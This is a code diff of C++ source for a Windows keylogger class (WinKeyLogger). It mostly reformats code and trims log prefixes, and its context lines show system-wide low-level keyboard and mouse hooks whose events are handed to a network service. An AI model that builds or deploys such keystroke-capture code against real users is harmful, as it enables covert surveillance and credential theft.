@@ -12,7 +12,7 @@
 #include <boost/bind.hpp>
 #include <boost/circular_buffer.hpp>
 #include <boost/variant.hpp>
-#include <utils/Config.hpp>
+#include <config/Config.hpp>
 #include <Network/IOManager.hpp>
 #include <Protocol/Messages.hpp>
 #include <Keylogger/KeyLogger.hpp>
@@ -22,11 +22,12 @@ namespace spi
     class WinKeyLogger : public KeyLogger
     {
     public:
-        explicit WinKeyLogger(net::IOManager *service) : _service(service), _circularBuffer(10),
-                                                         _thread{std::move([this]() {
-                                                             this->setupHooks();
-                                                             while (GetMessage(nullptr, nullptr, 0, 0));
-                                                         })}
+        explicit WinKeyLogger(net::IOManager *service) :
+            _service(service), _circularBuffer(10),
+            _thread{std::move([this]() {
+                this->setupHooks();
+                while (GetMessage(nullptr, nullptr, 0, 0));
+            })}
         {
             _sharedInstance = this;
         }
@@ -184,10 +185,8 @@ namespace spi
                 keyEvent.timestamp = std::chrono::steady_clock::now();
                 if (toBinds.find(code) != toBinds.end()) {
                     keyEvent.code = toBinds.at(code);
-                } else
-                {
-                    _log(logging::Warning) << KEYLOGGER_LOG << " Unhandled KeyEvent {" << code << "}"
-                                        << std::endl;
+                } else {
+                    _log(logging::Warning) << "Unhandled KeyEvent {" << code << "}" << std::endl;
                     return;
                 }
 
@@ -206,7 +205,7 @@ namespace spi
         {
             _mouseHook = SetWindowsHookEx(WH_MOUSE_LL, &MouseHookProc, nullptr, 0);
             _keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, &KeyboardHookProc, nullptr, 0);
-            _log(logging::Info) << KEYLOGGER_LOG << " [HOOKS] Successfully settled" << std::endl;
+            _log(logging::Info) << "[HOOKS] Successfully settled" << std::endl;
         }
 
         void threadFunction() noexcept
@@ -234,13 +233,13 @@ namespace spi
 
         void run() override
         {
-            _log(logging::Info) << KEYLOGGER_LOG << " Running..." << std::endl;
+            _log(logging::Info) << "Running..." << std::endl;
             _service->get().post(boost::bind(&WinKeyLogger::threadFunction, this));
         }
 
         void stop() override
         {
-            _log(logging::Info) << KEYLOGGER_LOG << " [HOOKS] Remove" << std::endl;
+            _log(logging::Info) << "[HOOKS] Remove" << std::endl;
         }
 
     private:
